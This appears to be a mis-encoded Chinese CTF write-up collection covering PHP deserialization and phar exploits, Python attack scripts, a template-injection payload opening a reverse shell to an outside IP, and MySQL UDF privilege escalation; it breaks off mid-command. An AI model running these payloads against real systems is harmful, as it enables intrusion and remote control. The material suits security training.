2.pyc\n\nä¸€çœ¼æ€€ç–‘fVJXNjE0ODBpM2RrZmNSVzYxNDgwaTNka01BSlVPe25oc20=æ˜¯base64\nè§£å¯†å¾—åˆ°\n}RW61480i3dkfcRW61480i3dkMAJUO{nhsm\nåˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†ï¼Œrotå’Œé€†å‘è¾“å‡º\n123&#125;RW61480i3dkfcRW61480i3dkMAJUO&#123;nhsm&#125;KP61480b3wdyvKP61480b3wdFTCNH&#123;galfflag&#123;HNCTFdw3b08416PKvydw3b08416PK&#125; å¾—åˆ°flag\n\nRE4ä½¿ç”¨ dnSpy æˆ–å…¶ä»–è°ƒè¯•å·¥å…·ï¼ŒåŠ è½½ç¨‹åºå¹¶è®¾ç½®æ–­ç‚¹ï¼Œç‰¹åˆ«æ˜¯åœ¨ç”Ÿæˆè¿·å®«ä¹‹åçš„ä½ç½®ã€‚åœ¨ç¨‹åºè¿è¡Œåˆ°ç”Ÿæˆè¿·å®«åï¼Œæš‚åœæ‰§è¡Œã€‚åœ¨å†…å­˜ä¸­æŸ¥æ‰¾è¿·å®«æ•°æ®ï¼Œé€šå¸¸éœ€è¦åœ¨è°ƒè¯•å™¨çš„å†…å­˜è§†å›¾ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚æ‰¾åˆ°è¿·å®«æ•°æ®åï¼Œå°†å…¶æå–å‡ºæ¥ã€‚å¦‚æœè¿·å®«æ•°æ®ç»è¿‡ RC4 åŠ å¯†ï¼Œéœ€è¦æ‰¾åˆ°ç›¸åº”çš„å¯†é’¥å’Œè§£å¯†é€»è¾‘ã€‚ä½¿ç”¨ RC4 è§£å¯†ç®—æ³•å°†æå–çš„è¿·å®«æ•°æ®è§£å¯†ã€‚ \n123456700******0000*000000*0**0******0*0**0**100*000**0****0******0****00000000r (å³) d (ä¸‹) u (ä¸Š) l (å·¦)\n\nNSSç³»åˆ—æ–‡ä»¶åŒ…å«å’Œåºåˆ—åŒ–ç»¼åˆ[ZJCTF 2019]NiZhuanSiWei\n https://www.nssctf.cn/problem/22 \n12345678910111213141516171819 &lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php\nbase64è§£ç \n12345678910111213&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  \n\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:â€Flagâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}\nç„å­¦è¯¡å¼‚sqlé¢˜ https://www.nssctf.cn/problem/1093 \nè¯¦è§£ https://www.cnblogs.com/junlebao/p/13859371.html \nprizeç³»åˆ—prize_p1ä¸€ä¸ªpharæ–‡ä»¶ç»è¿‡å‹ç¼©ä¹‹åï¼Œå†ç”¨pharåè®®è¯»å–æ‰“å¼€ï¼Œä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„\n\næ™®é€šphar\ngzip\nbzip2\ntar\nzip\n\nä¸€å…±å°±5ä¸­å¯ä»¥è§¦å‘pharæ“ä½œ\n12345678910111213141516171819202122232425262728293031&lt;?phphighlight_file(__FILE__);class getflag &#123;    function __destruct() &#123;        echo getenv(&quot;FLAG&quot;);    &#125;&#125;class A &#123;    public $config;    function __destruct() &#123;        if ($this-&gt;config == &#x27;w&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&quot;);            &#125;            file_put_contents(&quot;./tmp/a.txt&quot;, $data);        &#125; else if ($this-&gt;config == &#x27;r&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&quot;);            &#125;            echo file_get_contents($data);        &#125;    &#125;&#125;if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $_GET[0])) &#123;    die(&quot;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&quot;);&#125;unserialize($_GET[0]);throw new Error(&quot;é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§&quot;);\n\nä»£ç å®¡è®¡ç¬¬ä¸€éƒ¨ä»½123456789101112131415161718class A &#123;    public $config;    function __destruct() &#123;        if ($this-&gt;config == &#x27;w&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&quot;);            &#125;            file_put_contents(&quot;./tmp/a.txt&quot;, $data);        &#125; else if ($this-&gt;config == &#x27;r&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&quot;);            &#125;            echo file_get_contents($data);        &#125;    &#125;&#125;\n\nè¿™ä¸€æ®µå¯ä»¥çœ‹è§å½“\nconfig&#x3D;wæ—¶æ˜¯å†™å…¥.&#x2F;tmp&#x2F;a.txtå†…å®¹\nconfig&#x3D;ræ—¶æ˜¯è¯»å–æ–‡ä»¶å†…å®¹\nç¬¬äºŒéƒ¨åˆ†12function __destruct()throw new Error(&quot;é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§&quot;);\n\n__destructå’Œthrow new Errorçš„å…³ç³»\néœ€è¦é€šè¿‡CGåƒåœ¾å›æ”¶æ¥ç»•è¿‡\nç¬¬ä¸‰éƒ¨åˆ†12345class getflag &#123;    function __destruct() &#123;        echo getenv(&quot;FLAG&quot;);    &#125;&#125;\n\nå¯ä»¥é€šè¿‡è¿™ä¸ªgetflagç±»æ¥è·å–FLAG\nä»£ç å®¡è®¡æ•´ç†æ€è·¯å¾—å‡º\nå…ˆç”Ÿæˆgetflagç±»çš„pharæ–‡ä»¶ï¼Œå°†pharæ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹ç»•è¿‡å¼‚å¸¸æŠ›å‡º\nä½†æ˜¯ï¼Œæ¯ä¸€ä¸ªpharæ–‡ä»¶éƒ½æœ‰ç›¸åº”çš„ç­¾åï¼Œç›´æ¥ä¿®æ”¹ä¼šå¯¼åˆ¶æ–‡ä»¶å¤±æ•ˆï¼Œæ‰€ä»¥è¿˜éœ€è¦æ ¹æ®ä¿®æ”¹åçš„æ–‡ä»¶æ¥ä¿®å¤ç­¾å\nç”Ÿäº§pharæ–‡ä»¶ ph1.phar123456789101112&lt;?phpclass getflag&#123;&#125;$a = new getflag();$a = array(0=&gt;$a,1=&gt;null);$phar = new Phar(&quot;ph1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;\n\nä¿®æ”¹ph1.pharæ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç»•è¿‡å¼‚å¸¸æŠ›å‡º\nå°†å€’æ•°ç¬¬äºŒä¸ª1æ”¹ä¸ºé›¶\n\nä¿®å¤ç­¾åç”Ÿæˆå¯ç”¨æ–‡ä»¶ph2.phar\n123456789from hashlib import sha256with open(&quot;ph1.phar&quot;, &#x27;rb&#x27;) as f:    text = f.read()    main = text[:-40]  # æ­£æ–‡éƒ¨åˆ†(é™¤å»æœ€å40å­—èŠ‚)    end = text[-8:]  # æœ€åå…«ä½ä¹Ÿæ˜¯ä¸å˜çš„    new_sign = sha256(main).digest()    new_phar = main + new_sign + end    open(&quot;ph2.phar&quot;, &#x27;wb&#x27;).write(new_phar)  # å°†æ–°ç”Ÿæˆçš„å†…å®¹ä»¥äºŒè¿›åˆ¶æ–¹å¼è¦†ç›–å†™å…¥åŸæ¥çš„pharæ–‡ä»¶\n\nä¸€ä¸ªpharæ–‡ä»¶ç»è¿‡å‹ç¼©ä¹‹åï¼Œå†ç”¨pharåè®®è¯»å–æ‰“å¼€ï¼Œä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„\n\næ™®é€šphar\ngzip\nbzip2\ntar\nzip\n\nä¸€å…±å°±5ç§å¯ä»¥è§¦å‘pharæ“ä½œ\nä¸Šè¿°ä»»æ„ä¸€ç§æ–¹å¼æ¥è¿›è¡Œå†™å…¥å’Œè¯»å–\nå‹ç¼©ç»•è¿‡1234567891011121314151617181920212223242526272829303132333435import requestsimport gzipimport reurl = &#x27;http://node4.anna.nssctf.cn:28723/&#x27;file = open(&quot;./ph2.phar&quot;, &quot;rb&quot;)  # æ‰“å¼€æ–‡ä»¶file_out = gzip.open(&quot;./phar.zip&quot;, &quot;wb+&quot;)  # åˆ›å»ºå‹ç¼©æ–‡ä»¶å¯¹è±¡file_out.writelines(file)file_out.close()file.close()requests.post(    url,    params=&#123;        0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;    &#125;,    data=&#123;        0: open(&#x27;./phar.zip&#x27;, &#x27;rb&#x27;).read()    &#125;)  # å†™å…¥res = requests.post(    url,    params=&#123;        0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;    &#125;,    data=&#123;        0: &#x27;phar://tmp/a.txt&#x27;    &#125;)  # è§¦å‘res.encoding = &#x27;utf-8&#x27;flag = re.compile(&#x27;(NSSCTF\\&#123;.+?\\&#125;)&#x27;).findall(res.text)[0]print(flag)\n\næ•°ç»„ç»•è¿‡1234567891011121314151617import requestsimport reurl=&quot;http://node4.anna.nssctf.cn:28853/&quot;### å†™å…¥pharæ–‡ä»¶with open(&quot;ph2.phar&quot;,&#x27;rb&#x27;) as f:    data1=&#123;&#x27;0[]&#x27;:f.read()&#125;          #ä¼ æ•°ç»„ç»•è¿‡ï¼Œå€¼å°±æ˜¯hacker1.pharæ–‡ä»¶çš„å†…å®¹    param1 = &#123;0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;&#125;    res1 = requests.post(url=url, params=param1,data=data1)### è¯»pharæ–‡ä»¶ï¼Œè·å–flagparam2=&#123;0:&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;&#125;data2=&#123;0:&quot;phar://tmp/a.txt&quot;&#125;res2=requests.post(url=url,params=param2,data=data2)flag=re.compile(&#x27;NSSCTF\\&#123;.*?\\&#125;&#x27;).findall(res2.text)print(flag)\n\n\n\nprize_p5é¢˜å¹²123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phperror_reporting(0);class catalogue&#123;    public $class;    public $data;    public function __construct()    &#123;        $this-&gt;class = &quot;error&quot;;        $this-&gt;data = &quot;hacker&quot;;    &#125;    public function __destruct()    &#123;        echo new $this-&gt;class($this-&gt;data);    &#125;&#125;class error&#123;    public function __construct($OTL)    &#123;        $this-&gt;OTL = $OTL;        echo (&quot;hello &quot;.$this-&gt;OTL);    &#125;&#125;class escape&#123;    public $name = &#x27;OTL&#x27;;    public $phone = &#x27;123666&#x27;;    public $email = &#x27;sweet@OTL.com&#x27;;&#125;function abscond($string) &#123;    $filter = array(&#x27;NSS&#x27;, &#x27;CTF&#x27;, &#x27;OTL_QAQ&#x27;, &#x27;hello&#x27;);    $filter = &#x27;/&#x27; . implode(&#x27;|&#x27;, $filter) . &#x27;/i&#x27;;    return preg_replace($filter, &#x27;hacker&#x27;, $string);&#125;if(isset($_GET[&#x27;cata&#x27;]))&#123;    if(!preg_match(&#x27;/object/i&#x27;,$_GET[&#x27;cata&#x27;]))&#123;        unserialize($_GET[&#x27;cata&#x27;]);    &#125;    else&#123;        $cc = new catalogue();        unserialize(serialize($cc));    &#125;    if(isset($_POST[&#x27;name&#x27;])&amp;&amp;isset($_POST[&#x27;phone&#x27;])&amp;&amp;isset($_POST[&#x27;email&#x27;]))&#123;        if (preg_match(&quot;/flag/i&quot;,$_POST[&#x27;email&#x27;]))&#123;            die(&quot;nonono,you can not do that!&quot;);        &#125;        $abscond = new escape();        $abscond-&gt;name = $_POST[&#x27;name&#x27;];        $abscond-&gt;phone = $_POST[&#x27;phone&#x27;];        $abscond-&gt;email = $_POST[&#x27;email&#x27;];        $abscond = serialize($abscond);        $escape = get_object_vars(unserialize(abscond($abscond)));        if(is_array($escape[&#x27;phone&#x27;]))&#123;            echo base64_encode(file_get_contents($escape[&#x27;email&#x27;]));        &#125;        else&#123;            echo &quot;I&#x27;m sorry to tell you that you are wrong&quot;;        &#125;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\nè§£æ³•ä¸€åºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸1echo base64_encode(file_get_contents($escape[&#x27;email&#x27;]));\n\nå¯ä»¥çŸ¥é“æ˜¯è®©emailçš„å€¼ä¸ºflagæ–‡ä»¶\n1if (preg_match(&quot;/flag/i&quot;,$_POST[&#x27;email&#x27;]))\n\néœ€è¦ç»•è¿‡æ­£åˆ™åˆ¤æ–­\n1234function abscond($string) &#123;    $filter = array(&#x27;NSS&#x27;, &#x27;CTF&#x27;, &#x27;OTL_QAQ&#x27;, &#x27;hello&#x27;);    $filter = &#x27;/&#x27; . implode(&#x27;|&#x27;, $filter) . &#x27;/i&#x27;;    return preg_replace($filter, &#x27;hacker&#x27;, $string);\n\nçœ‹åˆ°è¿™é‡Œçš„æ—¶å€™å°±çŸ¥é“æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº†ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†å­—ç¬¦ä¸²å¢å¤šé€ƒé€¸\n123456789101112&lt;?phpclass escape&#123;    public $name = &#x27;OTL&#x27;;    public $phone = [&#x27;123&#x27;, &#x27;666&#x27;];  // æ”¹ä¸ºæ•°ç»„    public $email = &#x27;/flag&#x27;;&#125;$es = new escape();echo serialize($es);?&gt;//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;OTL&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;\n\n&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;æ˜¯ç›®æ ‡å­—ç¬¦ä¸²é•¿åº¦73\n12a=&#x27;hello&#x27;print(a*73)\n\npayload\n12345GET:?cata=1POST:name=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;phone[]=1&amp;email=1\n\nè¿™ç§è§£æ³•ä¸class catalogueå…³ç³»ä¸å¤§æ‰€ä»¥cataéšä¾¿èµ‹å€¼å³å¯\nè§£æ³•äºŒé€šè¿‡phpåŸç”Ÿç±»æ¥è¯»å–æ–‡ä»¶12345678910111213class catalogue&#123;    public $class;    public $data;    public function __construct()    &#123;        $this-&gt;class = &quot;error&quot;;        $this-&gt;data = &quot;hacker&quot;;    &#125;    public function __destruct()    &#123;        echo new $this-&gt;class($this-&gt;data);    &#125;&#125;\n\n12345678if(isset($_GET[&#x27;cata&#x27;]))&#123;    if(!preg_match(&#x27;/object/i&#x27;,$_GET[&#x27;cata&#x27;]))&#123;        unserialize($_GET[&#x27;cata&#x27;]);    &#125;    else&#123;        $cc = new catalogue();        unserialize(serialize($cc));    &#125;\n\nä¸»è¦ç”¨åˆ°è¿™ä¸¤éƒ¨åˆ†\necho new $this-&gt;class($this-&gt;data);\nçœ‹åˆ°è¿™é‡Œå°±å¯ä»¥çŸ¥é“å°†\n12345678910111213&lt;?phpclass catalogue &#123;public $class = &#x27;FilesystemIterator&#x27;;public $data = &#x27;glob:///f*&#x27;;public function __toString() &#123;return &quot;Class: &quot; . $this-&gt;class . &quot;, Data: &quot; . $this-&gt;data;&#125;&#125;$ca = new catalogue();echo serialize($ca); // O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;data&quot;;s:10:&quot;glob:///f*&quot;;&#125;\n\né€šè¿‡è¿™ä¸ªæŸ¥çœ‹æ–‡ä»¶åï¼Œçœ‹åˆ°flag\nåœ¨é€šè¿‡SplFileObjectè¯»å–æ–‡ä»¶å†…å®¹O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;\nç”±äº!preg_match(&#39;/object/i&#39;ï¼‰\næ‰‹åŠ¨æ”¹é“¾å­\nåœ¨åºåˆ—åŒ–é“¾å­ä¸­ Så¯ä»¥è¯†åˆ«16è¿›åˆ¶å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ä¿®æ”¹é“¾å­\n\nO:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileO\\62ject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;\n\n\\62æ˜¯bçš„asciiå½¢å¼ \n\nç›´æ¥è¯»å–flag\nç¬¬å››å±Šæå®¢å°‘å¹´æŒ‘æˆ˜èµ›åˆèµ›ezunserilize1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;?phpshow_source(__FILE__);//you should find flag in you selfclass one&#123;    public $a;    function new()&#123;        printf(&quot;i am new baby&quot;);    &#125;    public function __wakeup()    &#123;        $this-&gt;a-&gt;new();    &#125;&#125;class two&#123;    public $func;    public $arg;    public function __call($func,$arg)    &#123;        $this-&gt;func-&gt;arg;    &#125;&#125;class three&#123;    public $kkk;    public function __get($kkk)&#123;        return &quot;look!you are hero&quot;.$this-&gt;kkk;    &#125;&#125;class four &#123;    public $s;    public function eval()    &#123;        $pattern = &quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;;        if (preg_match($pattern, $this-&gt;s)) &#123;            print(&quot;oh nonono hacker!&quot;);            return &#x27;&#x27;;        &#125; else &#123;            return system($this-&gt;s);        &#125;    &#125;    public function __toString() &#123;        $this-&gt;eval();        return &#x27;aaaa&#x27;;    &#125;&#125;(unserialize(base64_decode($_GET[&#x27;cmd&#x27;]))); \n\næ„é€ poc\n1234567891011121314151617181920212223242526272829&lt;?phpclass one&#123;    public $a; //3 $tw&#125;class two&#123;    public $func; // 2 $th    public $arg;&#125;class three&#123;    public $kkk; //1 $fo&#125;class four &#123;    public $s=&#x27;$&quot;\\154\\163&quot;&#x27;;&#125;$o =new one;$tw =new two;$th=new three;$fo = new four;$th-&gt;kkk=$fo;$tw-&gt; func=$th;$o-&gt;a=$tw;echo serialize($o);\n\nè§£æ³•ä¸€ï¼šæ„é€ å…«è¿›åˆ¶å‘½ä»¤é¦–å…ˆæƒ³åˆ°çš„æ˜¯æ„é€ å…«è¿›åˆ¶å‘½ä»¤\n1234567891011121314151617181920def get_oct(c):    &quot;&quot;&quot;å°†å­—ç¬¦è½¬æ¢ä¸ºå…«è¿›åˆ¶è¡¨ç¤º&quot;&quot;&quot;    return format(ord(c), &#x27;03o&#x27;)  # ä½¿ç”¨03oæ ¼å¼ï¼Œç¡®ä¿æ¯ä¸ªå­—ç¬¦çš„å…«è¿›åˆ¶è¡¨ç¤ºä¸ºä¸‰ä½æ•°def cmd_to_oct(cmd):    &quot;&quot;&quot;å°†å‘½ä»¤å­—ç¬¦ä¸²è½¬æ¢ä¸ºå…«è¿›åˆ¶è½¬ä¹‰æ ¼å¼&quot;&quot;&quot;    payload = &quot;$&#x27;&quot;    for c in cmd:        if c == &#x27; &#x27;:            payload += &quot;&#x27; $&#x27; &quot;  # åœ¨ç©ºæ ¼å¤„æ’å…¥è½¬ä¹‰è¡¨ç¤º        else:            payload += &quot;\\\\&quot; + get_oct(c)  # æ·»åŠ å­—ç¬¦çš„å…«è¿›åˆ¶è½¬ä¹‰è¡¨ç¤º    payload += &quot;&#x27;&quot;    return payload# ç¤ºä¾‹ç”¨æ³•if __name__ == &quot;__main__&quot;:    command = input(&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„å‘½ä»¤: &quot;)  # ä»ç”¨æˆ·è¾“å…¥è·å–å‘½ä»¤    oct_payload = cmd_to_oct(command)  # è½¬æ¢å‘½ä»¤    print(&quot;è½¬æ¢åçš„å…«è¿›åˆ¶è¡¨ç¤º:&quot;, oct_payload)  # è¾“å‡ºè½¬æ¢ç»“æœ\n\nç©ºæ ¼æ›¿æ¢\\tä½†æ˜¯ls &#x2F;å­˜åœ¨ç©ºæ ¼ç›´æ¥æ‹¿burpæŠ“åŒ…å¯¹å…¶16è¿›åˆ¶ä¿®æ”¹\n\nå°†20æ”¹ä¸º09\nå¤åˆ¶payload,è¿›è¡Œbase64åŠ å¯†\nls\t&#x2F;O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:19:&quot;$&#39;\\154\\163&#39;\t$&#39;\\057&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;\nTzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjE5OiIkJ1wxNTRcMTYzJwkkJ1wwNTcnIjt9fXM6MzoiYXJnIjtOO319\n\ncat\t&#x2F;4l2gO:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:39:&quot;$&#39;\\143\\141\\164&#39;\t$&#39;\\057\\064\\154\\062\\147&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;\nTzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjM5OiIkJ1wxNDNcMTQxXDE2NCcJJCdcMDU3XDA2NFwxNTRcMDYyXDE0NyciO319czozOiJhcmciO047fX0&#x3D;\n\n\nè§£é‡Šä¸ºä»€ä¹ˆä¸ç”¨${IFS}\n\nç‰µæ‰¯åˆ°base64ç¼–ç \nä¸€äº›linuxå¹¶ä¸èƒ½è¯†åˆ«${IFS}\n\n\nè§£æ³•äºŒï¼šmoreç»•è¿‡ç›´æ¥payload\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php//you should find flag in you selfclass one&#123;    public $a;    function new()&#123;        printf(&quot;i am new baby&quot;);    &#125;    public function __wakeup()    &#123;        $this-&gt;a-&gt;new();    &#125;&#125;class two&#123;    public $func;    public $arg;    public function __call($func,$arg)    &#123;        $this-&gt;func-&gt;arg;    &#125;&#125;class three&#123;    public $kkk;    public function __get($kkk)&#123;        return &quot;look!you are hero&quot;.$this-&gt;kkk;    &#125;&#125;class four &#123;    public $s;    public function eval()    &#123;        $pattern = &quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;;        if (preg_match($pattern, $this-&gt;s)) &#123;            print(&quot;oh nonono hacker!&quot;);            return &#x27;&#x27;;        &#125; else &#123;            return system($this-&gt;s);        &#125;    &#125;    public function __toString() &#123;        $this-&gt;eval();        return &#x27;aaaa&#x27;;    &#125;&#125;$obj_one = new one();$obj_two = new two();$obj_three = new three();$obj_four = new four();// Set up the chain$obj_four-&gt;s = &quot;more\t/*&quot;;$obj_three-&gt;kkk = $obj_four;$obj_two-&gt;func = $obj_three;$obj_one-&gt;a = $obj_two;$pop = serialize($obj_one);print(base64_encode($pop));//unserialize($pop);\n\n\n\nNISACTF 2022bingdundun~æ–‡ä»¶ä¸Šä¼ å’ŒåŒ…å«ç»“åˆä¾‹é¢˜\nhttps://www.nssctf.cn/problem/2026 \nå°†shellå‹ç¼©æˆzipè¿›è¡Œä¸Šä¼ \n\nä¸Šä¼ ä¹‹åç”¨pharä¼ªåè®®æ¥è§£å‹å‡ºè¯¥æ–‡ä»¶ä¸­çš„å†…å®¹\næœ€ç»ˆpayload:\nGET:  ?bingdundun&#x3D;phar:&#x2F;&#x2F;494ff243b2fc65c01462174e09e95088.zip&#x2F;web\nè¿æ¥èšå‰‘å³å¯\nbabyuploadCVE-2020-35736åˆ©ç”¨ os.path.join å¤„ç†è·¯å¾„çš„æ‹¼æ¥é—®é¢˜ https://www.nssctf.cn/problem/2025\n file_path = os.path.join(&quot;var&quot;, &quot;lib&quot;, filename)\nä¼ å…¥æ–‡ä»¶ä¼šè‡ªåŠ¨æ‹¼æ¥**&#x2F;var&#x2F;lib&#x2F;$filename** \nå¦‚æœå˜é‡åå‰æœ‰**&#x2F;ï¼Œos.path.joinä¼šå¿½ç•¥æ‰var&#x2F;lib** \neg:\n$filename&#x3D;&#x2F;flag \nè¯»å–è·¯å¾„ä¸º&#x2F;flag (ç›´æ¥è¯»å–æ ¹ç›®å½•çš„flag isset)\nbabyserializepop 4å¯¹è±¡ https://www.nssctf.cn/problem/1852\n2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å¤å­£èµ›brotherç›´æ¥fenjingä¸€æŠŠæ¢­1&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/8888 0&gt;&amp;1&#x27;&quot;).read()&#125;&#125;\n\nè¿›è¡Œåå¼¹shellåˆ°æœåŠ¡å™¨ä¸Š\nUDFææƒ12345cat /flag  #å‘ç°æƒé™ä¸å¤Ÿss -tuln   #æŸ¥çœ‹ç«¯å£cat api.py #å‘ç°mysqlç”¨æˆ·å’Œå¯†ç \n\nå‘ç°6666å¼€å¯mysqlæœåŠ¡\nå¯ä»¥å°è¯•è¿›è¡ŒUDFææƒ\næœåŠ¡å™¨å¼€å¯httpæœåŠ¡\nå°†lib_mysqludf_sys_64.soæ–‡ä»¶ä¼ è¾“åˆ°é¶æœºä¸Š\n123456789101112131415mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select @@version_compile_os, @@version_compile_machine;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;show variables like &#x27;%plugin%&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;create table foo(line blob);&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;insert into foo values(load_file(&#x27;/tmp/lib_mysqludf_sys_64.so&#x27;));&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select * from mysql.func;&quot;mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select 